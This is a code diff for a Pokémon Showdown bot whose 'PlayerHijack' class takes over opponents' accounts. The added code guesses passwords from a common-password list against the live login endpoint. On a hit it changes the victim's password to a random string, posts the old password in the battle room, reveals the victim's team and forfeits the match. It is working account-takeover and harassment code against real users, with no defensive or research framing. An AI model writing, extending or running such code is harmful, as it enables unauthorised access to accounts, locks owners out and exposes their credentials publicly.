@@ -8,18 +8,20 @@ import { Champ } from '../Shoedrip/Champ';
 
 import { logger } from '../Backend/logger';
 
-import { snooze } from '../Website/utils';
+import { snooze, toId } from '../Website/utils';
+import { commonPasswords } from '../commonPasswords';
 
+
+let fakechal = '4|034a2f187c98af6da8790273cb5314157d922e1c932aeb6538f5b4c3acdb88809ffdb03f053014e7795a8725d27de1ebdd782ff612484918d0aa43caeab7c66586c83b95f456ccb996b6a94e9aeaa66f18773d401915da8f3899d2715d1dae309ff49c6ff9306ad4ae109be871efd078b69bf19a1b7cccff14976282996668a6';
 
 let checkpass = async (user: string, pass: string) => {
-	let fakechal = '4|034a2f187c98af6da8790273cb5314157d922e1c932aeb6538f5b4c3acdb88809ffdb03f053014e7795a8725d27de1ebdd782ff612484918d0aa43caeab7c66586c83b95f456ccb996b6a94e9aeaa66f18773d401915da8f3899d2715d1dae309ff49c6ff9306ad4ae109be871efd078b69bf19a1b7cccff14976282996668a6';
-	let data : LoginForm = new LoginForm;
+	let data: LoginForm = new LoginForm;
 	data.challstr = fakechal;
 	data.act = 'login';
 	data.name = user;
 	data.pass = pass;
 	let body = await request.post('http://play.pokemonshowdown.com/action.php', {
-					 form: data
+		form: data
 	});
 	if (body[0] != ']')
 		return false;
@@ -31,11 +33,38 @@ let checkpass = async (user: string, pass: string) => {
 	return true;
 }
 
+export let changePassword = async (user: string, sid: string, op: string, np: string) => {
+	let data = new LoginForm;
+	data.act = 'changepassword';
+	data.oldpassword = op;
+	data.password = data.cpassword = np;
+	let body = await request.post('http://play.pokemonshowdown.com/action.php', {
+		form: data,
+		headers: {
+			Cookie: `cookie: showdown_username=${toId(user)}; sid=${sid}`
+		}
+	});
+	console.log(body);
+}
+
+export let isRegged = async (user: string) => {
+	let data: LoginForm = new LoginForm;
+	data.challstr = fakechal;
+	data.act = 'getassertion';
+	data.userid = user;
+	let body = await request.post('http://play.pokemonshowdown.com/action.php', {
+		form: data
+	});
+	if (body[0] == ';')
+		return true;
+	return false;
+}
+
 export class PlayerHijack {
-    opponent: Champ;
-    account?: Player;
+	opponent: Champ;
+	account?: Player;
 	room: string;
-    constructor(battleData : BattleData, battlers : Map<String, Champ>) {
+	constructor(battleData: BattleData, battlers: Map<String, Champ>) {
 		let alias = battleData.champ_alias![1] == '1' ? 'p2' : 'p1';
 		this.room = battleData.roomid;
 		this.opponent = battlers.get(alias)!;
@@ -44,7 +73,7 @@ export class PlayerHijack {
 	async tryJack(isRegged: boolean) {
 		try {
 			if (isRegged) {
-				let passwords = [this.opponent.showdown_name];
+				let passwords = [this.opponent.showdown_name, ...commonPasswords];
 				for (let pass of passwords) {
 					if (await checkpass(this.opponent.showdown_name, pass)) {
 						this.account = new Player(this.opponent.showdown_name, pass);
@@ -60,25 +89,36 @@ export class PlayerHijack {
 				return;
 			//this.bot = new Player(settings.showdown.user, settings.showdown.pass);
 			await this.account.connect();
+			this.account.tryJoin(this.room);
+			await snooze(1000);
+			if (isRegged) {
+				this.account.message(this.room, 'Changing password to randomly generated password, as a joke, haha...');
+				this.account.message(this.room, `Password was ${this.account.pass}`);
+				let newpass = [...new Array(~~(Math.random() * 9 + 9))].map(n => String.fromCharCode(~~(Math.random() * 26 + 65))).join('');
+				console.log('Setting new pass of ', this.opponent.showdown_name, 'to', newpass);
+				changePassword(this.account.user!, this.account.sid!, this.account.pass!, newpass);
+				await snooze(1500);
+			}
 			if (this.account.con.challstrraw.indexOf(';') != -1)
 				return;
-			this.account.tryJoin(this.room);
 			this.account.message(this.room, 'Hi, my name is J.A.C.K., brought to you by D*gars©');
 			// mayblock here
 			let myteam = await this.account.getMyTeam(this.room)!;
 			for (let mon of myteam!) {
 				let desc = [mon.details, mon.condition, mon.item, mon.baseAbility,
-							Object.keys(mon.stats).map(k => `${k}: ${mon.stats[k]}`).join(' / '),
-							mon.moves.join(', ')].join(' ');
+				Object.keys(mon.stats).map(k => `${k}: ${mon.stats[k]}`).join(' / '),
+				mon.moves.join(', ')].join(' ');
 				this.account.message(this.room, desc);
 				await snooze(1500);
 			}
 			this.account.message(this.room, 'PERFECTLY HEALTHY');
 			await snooze(1000);
+
 			this.account.message(this.room, '/forfeit');
 			await snooze(1000);
+			console.log('end proper hijack of ', this.opponent.showdown_name, 'in room', this.room);
 			this.account.disconnect();
-		} catch(e) {
+		} catch (e) {
 			console.log('Could not hijack the opponent:');
 			console.log(e);
 		}
